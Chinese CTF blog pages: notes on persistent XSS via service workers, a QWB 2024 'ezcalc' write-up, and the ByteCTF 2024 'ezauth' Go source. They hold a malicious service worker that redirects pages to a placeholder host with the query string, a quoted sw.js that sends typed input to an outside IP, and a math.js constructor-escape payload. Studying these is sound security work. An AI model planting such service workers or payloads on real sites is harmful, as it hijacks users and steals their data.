<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>怎么劫持bot在expr中的输入？</p>
<p>思路1：控制&#x2F;templates&#x2F;index.tpl   利用上传功能点去覆盖 。但app服务端对上传的文件目录锁在了static且文件名随机了。</p>
<p>没有思路，如果不了解service-worker。</p>
<h3 id="service-worker"><a href="#service-worker" class="headerlink" title="service-worker"></a>service-worker</h3><p>sw 经注册到”浏览器”(存疑) 后，可作为代理中间人拦截修改请求。</p>
<p>浏览器启动时会检测是否支持并注册有SW，若有，则优先加载SW。</p>
<p>chrome:&#x2F;&#x2F;serviceworker-internals&#x2F;</p>
<p>edge:&#x2F;&#x2F;serviceworker-internals&#x2F;</p>
<p>可以看SW名单及所属域</p>
<p>正常页面的注册流程</p>
<p>&#x2F;index</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/26908589/1731025731429-01f70d16-d0a4-423d-8600-66f4cf8b252e.png" alt="img"></p>
<p>&#x2F;index-&gt;&#x2F;js&#x2F;sw-registration.js</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/26908589/1731025822918-46f86494-0cf0-4c6a-9238-16f50d9fa323.png" alt="img"></p>
<p>&#x2F;index-&gt;&#x2F;js&#x2F;sw-registration.js-&gt;&#x2F;sw.js</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/26908589/1731025982655-c07ab80e-563d-48d8-866d-192e124a1f14.png" alt="img"></p>
<p>检测一个网站是否已存在sw模块。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (&#x27;serviceWorker&#x27; in navigator) &#123;</span><br><span class="line">  navigator.serviceWorker.register(&#x27;/sw.js&#x27;).then(function(registration) &#123;</span><br><span class="line">    console.log(&#x27;ServiceWorker registration successful with scope: &#x27;,    registration.scope);</span><br><span class="line">  &#125;).catch(function(err) &#123;</span><br><span class="line">    console.log(&#x27;ServiceWorker registration failed: &#x27;, err);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>service-worker的解析scope</p>
<p>在网页中，如果没有显式地引入 <code>sw.js</code> 文件，浏览器通常不会默认解析它并将其作为 Service Worker 来处理。</p>
<p>Service Worker 的注册是一个明确的操作，一般需要在网页的 JavaScript 代码中通过类似以下方式进行注</p>
<p>测。Service Worker 相关的解析和注册信息主要存储在客户端浏览器中，而不是在服务端。</p>
<p>出于安全考量，Service workers有一些限制：</p>
<ol>
<li>只能注册同源下的js</li>
<li>网站必须是<code>**https://**</code>或者<code>**http://localhost/**</code></li>
<li>content-type 为 *&#x2F;javascript</li>
<li>Worker 线程不能获得下列对象：DOM对象，Windows对象，document对象，parent对象。</li>
</ol>
<p>sw.js注册函数</p>
<p><strong>ServiceWorkerContainer</strong>.register(<strong>scriptURL</strong>, <strong>options</strong>) </p>
<p><strong>navigator</strong>.serviceWorker.register(<strong>scriptURL</strong>, <strong>options</strong>) #返回一个<strong>ServiceWorkerContainer</strong>对象。</p>
<h4 id="浏览器模型-持久化xss基础-先知社区"><a href="#浏览器模型-持久化xss基础-先知社区" class="headerlink" title="浏览器模型 持久化xss基础 - 先知社区"></a>浏览器模型 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8679?time__1311=n4+xnD0DcDu70=eRq05+tOeeiKqD5teqtPQx#toc-1">持久化xss基础 - 先知社区</a></h4><p>多进程(模块)：</p>
<ol>
<li><p>浏览器主进程  主控和调用，创建和销毁其他进</p>
</li>
<li><p>GPU进程 </p>
</li>
<li><p>渲染进程  每个tab 一个进程 下属五个线程：</p>
</li>
<li><p>GUI 线程  复制页面渲染 加载html生成dom树，加载css生成css树，两树拼接后，计算node位置(重排)，渲染node图像(重绘)。与js线程互斥，防止JS执行改变dom而gui不知。</p>
</li>
<li><p>js线程  执行js。v5之前是单线程，为了提高cpu效率，提出多线程。js多线程为主线程开子线程，限制子线程资源。service-worker正是子线程，因此受到限制。</p>
</li>
</ol>
<ul>
<li>DOM对象</li>
<li>window对象的某些属性和方法</li>
<li>documen对象</li>
<li>parent对象</li>
</ul>
<ol>
<li><p>定时触发的线程</p>
</li>
<li><p>异步请求线程</p>
</li>
<li><p>事件触发的线程</p>
</li>
<li><p>插件进程</p>
</li>
</ol>
<h4 id="潜在攻击点1-文件上传劫持sw-js-sw-registration-js"><a href="#潜在攻击点1-文件上传劫持sw-js-sw-registration-js" class="headerlink" title="潜在攻击点1 文件上传劫持sw.js&#x2F;sw-registration.js"></a>潜在攻击点1 文件上传劫持sw.js&#x2F;sw-registration.js</h4><p>升级成存储型XSS获取敏感信息。</p>
<h4 id="攻击点2-Jsonp注册sw"><a href="#攻击点2-Jsonp注册sw" class="headerlink" title="攻击点2 Jsonp注册sw"></a>攻击点2 Jsonp注册sw</h4><p>Jsonp可跨域访问接口。我们可以自己开一个接口，使得调用该接口返回的内容为importScripts(&#x2F;&#x2F;a.com&#x2F;xx.js)</p>
<p>进而注册sw。</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iyiyang/articles/11641904.html">XSS持久化劫持之ServiceWorker - 镱鍚 - 博客园</a>  这篇博客写了具体的操作流程。可以对这篇博客进一步优化，jsonp请求参数设置成 importScripts(&#x2F;&#x2F;a.com&#x2F;xx.js)&#x2F;&#x2F; 来注释返回内容不需要的部分。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://example.com/jsonp.php?callback=test</span><br><span class="line"></span><br><span class="line">HTTP/1.1</span><br><span class="line">200 OK</span><br><span class="line">Content-Type:</span><br><span class="line">text/javascript; charset=UTF-8</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">test(&#123;[...]&#125;)</span><br></pre></td></tr></table></figure>





<p><code>setInterval</code> 方法设置了一个定时器</p>
<h4 id="恶意sw实例"><a href="#恶意sw实例" class="headerlink" title="恶意sw实例"></a>恶意sw实例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(&#x27;install&#x27;,function(event)&#123;</span><br><span class="line">  // Skip waiting so the SW activates immediately on install</span><br><span class="line">    self.skipWaiting();</span><br><span class="line">    console.log(&#x27;install ok!&#x27;);</span><br><span class="line">&#125;)</span><br><span class="line">self.addEventListener(&#x27;activate&#x27;, event =&gt; &#123;</span><br><span class="line">  // Activate immediately after installation</span><br><span class="line">    event.waitUntil(self.clients.claim());</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">self.addEventListener(&#x27;fetch&#x27;,function(event)&#123;</span><br><span class="line">    console.log(event.request);</span><br><span class="line">    event.respondWith(</span><br><span class="line">    caches.match(event.request).then(function(res)&#123;</span><br><span class="line">        return new Response(&#x27;&lt;script&gt;location=&quot;http://IP?&quot;+btoa(location.search)&lt;/script&gt;&#x27;, &#123;headers: &#123; &#x27;Content-Type&#x27;: &#x27;text/html&#x27; &#125;&#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    )</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<h3 id="qwb-ezcalc-注入sw"><a href="#qwb-ezcalc-注入sw" class="headerlink" title="qwb ezcalc 注入sw"></a>qwb ezcalc 注入sw</h3><p>有文件上传点，且利用&#x2F;static解析中间件的解析漏洞， navigator.serviceWorker.register(‘&#x2F;staticsw.js’)可以让我们控制sw的scope为整个根域，进而劫持bot对app的访问及flag的输入。</p>
<p>问题是，我们怎么显示的去让bot调用navigator.serviceWorker.register。</p>
<p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/85/#EzCalc">强网杯 2024 By W&amp;M - W&amp;M Team</a></p>
<p>math.js version 11.8.2 存在rce</p>
<p>我们在页面中输入的执行的expr ，同样会被bot执行一遍。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// could execute a nodejs script like &quot;return process.mainModule.require(child_process).execSync(whoami)&quot;</span><br><span class="line">const result = math.evaluate(&#x27;evalFunctionNode=parse(&quot;constructor(\&#x27;return process.version\&#x27;)&quot;)._compile(&#123;&#125;,&#123;&#125;);&#x27; +</span><br><span class="line">  &#x27;f=evalFunctionNode(null,cos);&#x27; +</span><br><span class="line">  &#x27;f()&#x27;)</span><br></pre></td></tr></table></figure>

<p>有一个小问题，原payload里面的evalFunctionNode 在页面引入的js中被压缩成了e</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e=<span class="title function_">parse</span>(<span class="string">&quot;constructor(&#x27;d=()=&gt;document.querySelector(`.ant-alert-message`);setInterval(()=&gt;&#123;if(d())d().innerHTML=114514&#125;,100);alert(1)&#x27;)&quot;</span>).<span class="title function_">_compile</span>(&#123;&#125;,&#123;&#125;);f=<span class="title function_">e</span>(<span class="literal">null</span>,cos);<span class="title function_">f</span>()</span><br></pre></td></tr></table></figure>

<p>成功劫持。</p>
<p>W&amp;M的wp里sw.js</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;installedstart&quot;);</span><br><span class="line">self.addEventListener(&#x27;install&#x27;, event =&gt; &#123;</span><br><span class="line">  // Skip waiting so the SW activates immediately on install</span><br><span class="line">  self.skipWaiting();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">self.addEventListener(&#x27;activate&#x27;, event =&gt; &#123;</span><br><span class="line">  // Activate immediately after installation</span><br><span class="line">  event.waitUntil(self.clients.claim());</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">const html = `</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;input id=&quot;expr&quot; placeholder=&quot;Math Expression&quot; class=&quot;ant-input css-ni1kz0 ant-input-outlined ant-input-compact-item ant-input-compact-first-item&quot; type=&quot;text&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;button id=&quot;calc&quot; type=&quot;button&quot; class=&quot;ant-btn css-ni1kz0 ant-btn-primary ant-btn-color-primary ant-btn-variant-solid ant-btn-compact-item ant-btn-compact-last-item&quot;&gt;&lt;span&gt;Calculate&lt;/span&gt;&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">calc.onclick = function()&#123;</span><br><span class="line">window.location.href = &quot;http://123.45.67.89:9990/flag?flag=&quot;+encodeURI(expr.value)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">`;</span><br><span class="line"></span><br><span class="line">self.addEventListener(&#x27;fetch&#x27;, event =&gt; &#123;</span><br><span class="line">console.log(event);</span><br><span class="line">  // Intercept the request for /index.html</span><br><span class="line">  if (event.request.url.endsWith(&#x27;/&#x27;)) &#123;</span><br><span class="line">    event.respondWith(</span><br><span class="line">      new Response(html, &#123;</span><br><span class="line">        headers: &#123; &#x27;Content-Type&#x27;: &#x27;text/html&#x27; &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>添加了一些操作，例如skipWaiting ， event.waitUntil(self.clients.claim())。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/31/ByteCTF2024%20ezauth/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Charger0">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Charger0">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/31/ByteCTF2024%20ezauth/" class="post-title-link" itemprop="url">bytectf2024 ezauth</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-11-01 03:38:24" itemprop="dateCreated datePublished" datetime="2024-11-01T03:38:24+08:00">2024-11-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-13 17:50:59" itemprop="dateModified" datetime="2024-11-13T17:50:59+08:00">2024-11-13</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="质量超高的一题，而且很有意思。"><a href="#质量超高的一题，而且很有意思。" class="headerlink" title="质量超高的一题，而且很有意思。"></a>质量超高的一题，而且很有意思。</h1><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;crypto/rand&quot;</span><br><span class="line">    &quot;errors&quot;</span><br><span class="line">    &quot;net/http&quot;</span><br><span class="line">    &quot;os&quot;</span><br><span class="line">    &quot;time&quot;</span><br><span class="line"></span><br><span class="line">    &quot;github.com/RobotsAndPencils/go-saml&quot;</span><br><span class="line">    &quot;github.com/gin-gonic/gin&quot;</span><br><span class="line">    &quot;github.com/golang-jwt/jwt/v4&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">// 定义自定义的JWT声明结构体，包含标准的声明和用户名</span><br><span class="line">type MyCustomClaims struct &#123;</span><br><span class="line">    jwt.StandardClaims</span><br><span class="line">    Username string `json:&quot;username&quot;`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 生成随机字符串函数，n是字符串长度</span><br><span class="line">func generateRandomString(n int) string &#123;</span><br><span class="line">    const letters = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="line">    bytes := make([]byte, n) // 创建长度为n的字节数组</span><br><span class="line">    if _, err := rand.Read(bytes); err != nil &#123;</span><br><span class="line">        return &quot;&quot; // 如果生成随机字节失败，则返回空字符串</span><br><span class="line">    &#125;</span><br><span class="line">    for i, b := range bytes &#123;</span><br><span class="line">        bytes[i] = letters[b%byte(len(letters))] // 将字节映射到字母表中</span><br><span class="line">    &#125;</span><br><span class="line">    return string(bytes) // 返回生成的随机字符串</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 定义全局变量secret_key（用于JWT签名的密钥）和random_code（随机验证码）</span><br><span class="line">var secret_key = generateRandomString(20)</span><br><span class="line">var random_code = generateRandomString(10)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    r := gin.Default() // 创建默认的Gin路由引擎</span><br><span class="line"></span><br><span class="line">    // 定义一个POST路由处理SAML断言请求</span><br><span class="line">    r.POST(&quot;/acs&quot;, func(c *gin.Context) &#123;</span><br><span class="line">        // 配置SAML服务提供商的设置</span><br><span class="line">        sp := saml.ServiceProviderSettings&#123;</span><br><span class="line">            PublicCertPath:              &quot;/usr/src/app/cert/default.crt&quot;,          // 公钥证书路径</span><br><span class="line">            PrivateKeyPath:              &quot;/usr/src/app/cert/default.key&quot;,          // 私钥路径</span><br><span class="line">            IDPSSOURL:                   &quot;http://idp/saml2&quot;,                       // 身份提供商的SSO URL</span><br><span class="line">            IDPSSODescriptorURL:         &quot;http://idp/issuer&quot;,                      // 身份提供商的描述符URL</span><br><span class="line">            IDPPublicCertPath:           &quot;/usr/src/app/cert/idpcert.crt&quot;,          // 身份提供商的公钥证书路径</span><br><span class="line">            SPSignRequest:               true,                                     // 是否签署请求</span><br><span class="line">            AssertionConsumerServiceURL: &quot;http://localhost:8000/saml_consume&quot;,     // SP的断言消费者服务URL</span><br><span class="line">        &#125;</span><br><span class="line">        sp.Init() // 初始化SAML服务提供商设置</span><br><span class="line"></span><br><span class="line">        // 从POST表单中获取SAML响应</span><br><span class="line">        encodedXML := c.PostForm(&quot;SAMLResponse&quot;)</span><br><span class="line">        if encodedXML == &quot;&quot; &#123;</span><br><span class="line">            // 如果SAML响应为空，返回错误</span><br><span class="line">            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAMLResponse form value missing&quot;&#125;)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 解析SAML响应</span><br><span class="line">        response, err := saml.ParseEncodedResponse(encodedXML)</span><br><span class="line">        if err != nil &#123;</span><br><span class="line">            // 如果解析失败，返回错误</span><br><span class="line">            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAMLResponse parse: &quot; + err.Error()&#125;)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 验证SAML响应</span><br><span class="line">        err = response.Validate(&amp;sp)</span><br><span class="line">        if err != nil &#123;</span><br><span class="line">            // 如果验证失败，返回错误</span><br><span class="line">            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAMLResponse validation: &quot; + err.Error()&#125;)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 获取SAML响应中的用户标识符uid</span><br><span class="line">        samlID := response.GetAttribute(&quot;uid&quot;)</span><br><span class="line">        if samlID == &quot;&quot; &#123;</span><br><span class="line">            // 如果uid缺失，返回错误</span><br><span class="line">            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAML attribute identifier uid missing&quot;&#125;)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 定义JWT声明，设置过期时间为7天</span><br><span class="line">        claims := MyCustomClaims&#123;</span><br><span class="line">            jwt.StandardClaims&#123;</span><br><span class="line">                ExpiresAt: time.Now().Add(time.Hour * 24 * 7).Unix(), // 过期时间</span><br><span class="line">                Issuer:    &quot;bytectf&quot;,                                  // 发行者</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;guest&quot;, // 用户名</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 使用HS256签名方法生成JWT令牌</span><br><span class="line">        token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)</span><br><span class="line">        tokenString, _ := token.SignedString([]byte(secret_key)) // 使用密钥签名生成token字符串</span><br><span class="line"></span><br><span class="line">        // 返回生成的JWT令牌和随机验证码</span><br><span class="line">        c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">            &quot;token&quot;: tokenString,</span><br><span class="line">            &quot;code&quot;:  random_code,</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    // 定义受JWT认证保护的路由组</span><br><span class="line">    auth := r.Group(&quot;/&quot;)</span><br><span class="line">    auth.Use(jwtauth()) // 使用JWT认证中间件</span><br><span class="line">    &#123;</span><br><span class="line">        // 受保护的/admin路由</span><br><span class="line">        auth.GET(&quot;/admin&quot;, func(c *gin.Context) &#123;</span><br><span class="line">            username, _ := c.Get(&quot;username&quot;) // 获取JWT中的用户名</span><br><span class="line">            code := c.Query(&quot;code&quot;)          // 获取请求中的code参数</span><br><span class="line">            if username == &quot;admin&quot; &amp;&amp; code == random_code &#123;</span><br><span class="line">                // 如果用户名为admin且code匹配，返回flag文件内容</span><br><span class="line">                flag, _ := os.ReadFile(&quot;/flag.txt&quot;)</span><br><span class="line">                c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">                    &quot;message&quot;: &quot;Welcome, admin! This is flag:&quot; + string(flag),</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // 否则返回未授权的错误</span><br><span class="line">                c.JSON(http.StatusUnauthorized, gin.H&#123;</span><br><span class="line">                    &quot;message&quot;: &quot;Unauthorized&quot;,</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 定义根路由，返回欢迎消息</span><br><span class="line">    r.GET(&quot;/&quot;, func(c *gin.Context) &#123;</span><br><span class="line">        c.String(http.StatusOK, &quot;Hello ByteCTF 2024! Please check in.&quot;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    // 启动服务器，监听58080端口</span><br><span class="line">    r.Run(&quot;:58080&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// JWT认证中间件函数</span><br><span class="line">func jwtauth() gin.HandlerFunc &#123;</span><br><span class="line">    return func(c *gin.Context) &#123;</span><br><span class="line">        token := c.GetHeader(&quot;Authorization&quot;) // 获取请求头中的Authorization字段</span><br><span class="line">        if token == &quot;&quot; &#123;</span><br><span class="line">            // 如果没有提供token，返回未授权</span><br><span class="line">            c.JSON(401, gin.H&#123;</span><br><span class="line">                &quot;message&quot;: &quot;Unauthorized&quot;,</span><br><span class="line">            &#125;)</span><br><span class="line">            c.Abort() // 中断请求</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        claims := &amp;MyCustomClaims&#123;&#125; // 初始化自定义声明结构</span><br><span class="line">        tk, err := jwt.ParseWithClaims(token, claims, func(token *jwt.Token) (interface&#123;&#125;, error) &#123;</span><br><span class="line">            return []byte(secret_key), nil // 使用密钥解析JWT</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        if err != nil &amp;&amp; !errors.Is(err, jwt.ErrTokenExpired) &#123;</span><br><span class="line">            // 如果解析失败并且不是因为过期错误，返回错误信息</span><br><span class="line">            c.JSON(401, gin.H&#123;</span><br><span class="line">                &quot;message&quot;: err.Error(),</span><br><span class="line">            &#125;)</span><br><span class="line">            c.Abort()</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 获取当前时间和JWT过期时间</span><br><span class="line">        currentTime := time.Now().Unix()</span><br><span class="line">        expirationTime := claims.ExpiresAt</span><br><span class="line">        timeSinceExpiration := currentTime - expirationTime</span><br><span class="line"></span><br><span class="line">        // 如果token过期且在24小时内，重新生成token</span><br><span class="line">        if err != nil &amp;&amp; errors.Is(err, jwt.ErrTokenExpired) &#123;</span><br><span class="line">            if timeSinceExpiration &gt;= 0 &amp;&amp; timeSinceExpiration &lt;= 86400 &#123;</span><br><span class="line">                claims.ExpiresAt = time.Now().Add(time.Hour * 24 * 7).Unix() // 续签7天</span><br><span class="line">                tk = jwt.NewWithClaims(jwt.SigningMethodHS256, claims)       // 重新生成JWT</span><br><span class="line">                newToken, _ := tk.SignedString([]byte(secret_key))            // 使用密钥签名新的token</span><br><span class="line">                c.Header(&quot;Authorization&quot;, newToken)                          // 将新的token添加到响应头</span><br><span class="line">                c.Abort()</span><br><span class="line">                return</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // 如果token过期时间超过24小时，返回错误</span><br><span class="line">                c.JSON(401, gin.H&#123;</span><br><span class="line">                    &quot;message&quot;: err.Error(),</span><br><span class="line">                &#125;)</span><br><span class="line">                c.Abort()</span><br><span class="line">                return</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 将用户名设置到Gin的上下文中供后续路由使用</span><br><span class="line">        c.Set(&quot;username&quot;, claims.Username)</span><br><span class="line">        c.Next() // 继续处理请求</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="环境选择"><a href="#环境选择" class="headerlink" title="环境选择"></a>环境选择</h1><p>kali + goland    不能用goland下载golang</p>
<p>deepin + goland   goland不能读取环境变量</p>
<p>选kali+手动下载GO1.20.1</p>
